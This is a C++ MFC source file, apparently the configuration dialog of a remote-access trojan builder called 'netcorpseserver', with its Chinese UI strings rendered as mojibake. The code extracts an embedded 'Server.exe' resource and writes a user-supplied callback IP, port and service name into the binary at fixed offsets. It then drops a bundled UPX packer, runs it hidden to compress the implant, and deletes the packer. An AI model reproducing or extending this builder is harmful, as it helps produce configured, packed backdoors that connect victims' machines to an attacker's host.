// ConfigDlg2.cpp : implementation file
//

#include "stdafx.h"
#include "netcorpseserver.h"
#include "ConfigDlg2.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

bool CreateTTEXE(CString strFilePath,int nResourceID,CString strResourceName);
bool CreateMyFile(CString strFilePath,LPBYTE lpBuffer,DWORD dwSize);
bool CreateEXE(CString strFilePath,int nResourceID,CString strResourceName);

CString strServiceName = "";
CString strPort = "";
CString strUrl = "";

/////////////////////////////////////////////////////////////////////////////
// CConfigDlg2 dialog


CConfigDlg2::CConfigDlg2(CWnd* pParent /*=NULL*/)
	: CDialog(CConfigDlg2::IDD, pParent)
{
	//{{AFX_DATA_INIT(CConfigDlg2)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}


void CConfigDlg2::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CConfigDlg2)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CConfigDlg2, CDialog)
	//{{AFX_MSG_MAP(CConfigDlg2)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CConfigDlg2 message handlers

void CConfigDlg2::OnOK() 
{
	GetDlgItemText(IDC_EDIT1,strUrl);
	GetDlgItemText(IDC_EDIT2,strPort);
	GetDlgItemText(IDC_EDIT5,strServiceName);


	strServiceName.TrimLeft();
	strServiceName.TrimRight();

	if(strServiceName.IsEmpty())
	{
		AfxMessageBox("����������Ϊ��");
		return;
	}

	
	strPort.TrimLeft();
	strPort.TrimRight();

	if(strPort.IsEmpty())
	{
		AfxMessageBox("�˿ڲ���Ϊ��");
		return;
	}	
	
	strUrl.TrimLeft();
	strUrl.TrimRight();
	
	if(strUrl.IsEmpty())
	{
		AfxMessageBox("������IP����Ϊ��");
		return;
	}
	

	CString strPath;
	 
	 TCHAR szFull[_MAX_PATH];
	 
	 TCHAR szDrive[_MAX_DRIVE];
	 
	 TCHAR szDir[_MAX_DIR];

	 TCHAR szFileName[_MAX_FNAME];
	 
	 ::GetModuleFileName(NULL, szFull, sizeof(szFull)/sizeof(TCHAR));
	 
	 _tsplitpath(szFull, szDrive, szDir, szFileName, NULL);
	 
	 _tcscpy(szFull, szDrive);
	 
	 _tcscat(szFull, szDir);
	 
	 strPath = CString(szFull);

	 //AfxMessageBox(strPath);
	 CString strTmpName = szDir;
	 CString strEXEName = strTmpName + "Server.exe";

	bool bRet = CreateTTEXE(strEXEName,IDR_EXE1,"EXE");	
	if(!bRet)
	{
		AfxMessageBox("�����ļ�ʱ��������,������!");
		return;
	}

	bRet = CreateEXE(strTmpName + "upx.exe",IDR_UPX1,"UPX");	
	if(!bRet)
	{
		AfxMessageBox("�����ļ�ʱ��������,������!");
		return;
	}

	HINSTANCE  nRet = ShellExecute(0, "open", "upx.exe", " Server.exe", NULL, SW_HIDE);
	if((int)nRet <= 32)
	{
		AfxMessageBox("ѹ���ļ�ʱ��������,������!");
		return;
	}

	//AfxMessageBox(strTmpName + "upx.exe");

	int  bRet1 = false;
	while(!bRet1)
	{
		bRet1 = DeleteFile("upx.exe");
	}

	AfxMessageBox("�ļ��������ڵ�ǰĿ¼!");

	CDialog::OnOK();
}


bool CreateMyFile(CString strFilePath,LPBYTE lpBuffer,DWORD dwSize)
{
	DWORD dwWritten;

	HANDLE hFile = CreateFile(strFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &dwWritten, NULL);
	else
	{
		//MessageBox(NULL,"�����ļ�ʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}

	CloseHandle(hFile);
	return true;
}

bool CreateTTEXE(CString strFilePath,int nResourceID,CString strResourceName)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	LPBYTE p;
	TCHAR szText[100];
	// �����������Դ
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(nResourceID), strResourceName);
	if (hResInfo == NULL)
	{
		//MessageBox(NULL, "������Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// �����Դ�ߴ�
	dwSize = SizeofResource(NULL, hResInfo);
	// װ����Դ
	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
	{
		//MessageBox(NULL, "װ����Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// Ϊ���ݷ���ռ�
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		//MessageBox(NULL, "�����ڴ�ʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// ������Դ����
	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);	
	
	
	memset(szText,0,sizeof(szText));
	memcpy(szText,(LPSTR)(LPCTSTR)strUrl,strUrl.GetLength());
	CopyMemory((LPVOID)(p + 0x8320), (LPCVOID)szText, 100);		//I

	memset(szText,0,sizeof(szText));
	memcpy(szText,(LPSTR)(LPCTSTR)strPort,strPort.GetLength());
	CopyMemory((LPVOID)(p + 0x8388), (LPCVOID)szText, 100);		//P

	memset(szText,0,sizeof(szText));
	memcpy(szText,(LPSTR)(LPCTSTR)strServiceName,strServiceName.GetLength());
	CopyMemory((LPVOID)(p + 0x8400), (LPCVOID)szText, 100);		//S


	bool bRet = CreateMyFile(strFilePath,p,dwSize);
	if(!bRet)
	{
		GlobalFree((HGLOBAL)p);
		return false;
	}

	GlobalFree((HGLOBAL)p);

	return true;
}

bool CreateEXE(CString strFilePath,int nResourceID,CString strResourceName)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	LPBYTE p;
	// �����������Դ
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(nResourceID), strResourceName);
	if (hResInfo == NULL)
	{
		//MessageBox(NULL, "������Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// �����Դ�ߴ�
	dwSize = SizeofResource(NULL, hResInfo);
	// װ����Դ
	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
	{
		//MessageBox(NULL, "װ����Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// Ϊ���ݷ���ռ�
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		//MessageBox(NULL, "�����ڴ�ʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// ������Դ����
	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);	

	bool bRet = CreateMyFile(strFilePath,p,dwSize);
	if(!bRet)
	{
		GlobalFree((HGLOBAL)p);
		return false;
	}

	GlobalFree((HGLOBAL)p);

	return true;
}
